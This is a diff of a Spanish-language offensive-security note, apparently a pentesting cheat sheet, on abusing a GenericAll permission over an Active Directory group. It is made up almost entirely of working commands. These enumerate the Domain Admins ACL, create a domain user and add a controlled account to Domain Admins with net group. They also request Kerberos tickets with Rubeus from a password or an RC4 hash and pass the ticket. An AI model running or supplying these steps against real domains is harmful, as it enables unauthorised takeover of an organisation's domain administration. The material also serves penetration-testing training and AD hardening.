@@ -4,21 +4,36 @@ Tags: #AD #ACL #Windows
 
 ## GenericAll sobre Grupo
 
+Si tenemos esta ACL sobre un grupo, tenemos control total sobre el objeto grupo, lo que permite modificar su membresía. En este flujo, utilizamos ese control para agregar usuarios al grupo Domain Admins, obteniendo así los privilegios asociados a sus miembros.
+
 ```powershell
+# OPCIONAL 
 ❯ import-module .\Microsoft.ActiveDirectory.Management.dll
+
 ❯ Get-ADGroup "Domain Admins" -Properties * | select -ExpandProperty ntSecurityDescriptor | Format-List  # Enumeramos los grupos de AD, sus propiedades 
+```
 
-❯ ./Rubeus.exe hash /password:Password@1    # Calcula el 'rc4_hmac'
-❯ ./Rubeus.exe asktgt /user:groupwrite.user /password:Password@1 /ptt   
-# Solicitamos el TGT con la password
+```powershell 
+# Crear un usuario en el dominio (OPCIONAL)
+❯ net user omar 'P@$$w0rd123!' /add /domain 
+❯ net user omar    # Verificar el usuario 
 
-❯ ./Rubeus.exe asktgt /user:groupwrite.user /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ptt # Solicitamos el TGT con el 'Hash', el cual lo genera en base64 haciendo un Pass-The-Ticket
-	# ptt = Pass-The-Ticket
+# Paso 1: Agregar el usuario controlado al grupo Domain Admins
+❯ net group "domain admins" ControlledAccount /add /domain
 
-❯ klist         # Mirar todos los tickets que se encuentran para los diferentes servicios 
-❯ klist purge   # Eliminar los tickets que estan en cache
+# Paso 2: Verificar que el usuario fue agregado correctamente
+❯ net group "domain admins" /domain
 
-❯ net group "domain admins" /domain     # Ver los usuarios del 'domain admin'
-❯ net group "domain admins" user.hacked /add /domain  # Agregamos el usuario comprometido al 'domain admin'
-❯ net group "domain admins" /domain     # Verificar que el nuevo usuario de ha añadido 
+# Paso 3: Si necesitas autenticarte como la cuenta controlada, solicitar un TGT con su contraseña y hacer Pass-The-Ticket
+❯ .\Rubeus.exe asktgt /user:groupwrite.user /password:Password@1 /ptt
+
+# Alternativa: solicitar el TGT utilizando el hash RC4
+❯ .\Rubeus.exe hash /password:Password@1
+❯ .\Rubeus.exe asktgt /user:groupwrite.user /rc4:<RC4_HASH> /ptt
+
+# Paso 4: Verificar los tickets Kerberos
+❯ klist
+
+# Objetivo:
+# GenericAll sobre el grupo → modificar su membresía → agregar user.hacked a Domain Admins → user.hacked obtiene los privilegios asociados a Domain Admins.
 ```
